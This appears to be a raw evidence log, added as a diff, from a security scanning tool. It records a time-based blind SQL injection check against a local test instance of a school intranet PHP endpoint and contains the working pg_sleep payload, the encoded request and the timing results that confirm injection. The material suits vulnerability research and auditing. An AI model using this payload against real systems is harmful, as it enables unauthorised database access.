@@ -1,0 +1,28 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:26.332015+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+# payload: 2026 AND (SELECT 1 FROM pg_sleep(2))=1 (read-only)
+
+### baseline: GET /intranet/educar_escola_ano_letivo_xml.php?esc=2&ano_atual=2026
+HTTP 200 elapsed=0.072s
+
+--- body ---
+<?xml version="1.0" encoding="UTF-8"?>
+<query xmlns="sugestoes">
+  <ano>2026</ano>
+</query>
+--- end body ---
+
+### injection: GET /intranet/educar_escola_ano_letivo_xml.php?esc=2&ano_atual=2026%20AND%20%28SELECT%201%20FROM%20pg_sleep%282%29%29%3D1
+HTTP 200 elapsed=2.078s
+
+--- body ---
+<?xml version="1.0" encoding="UTF-8"?>
+<query xmlns="sugestoes">
+  <ano>2026</ano>
+</query>
+--- end body ---
+
+# delta=2.007s threshold=1.5s
+# finished_at: 2026-09-11T00:17:28.844756+00:00
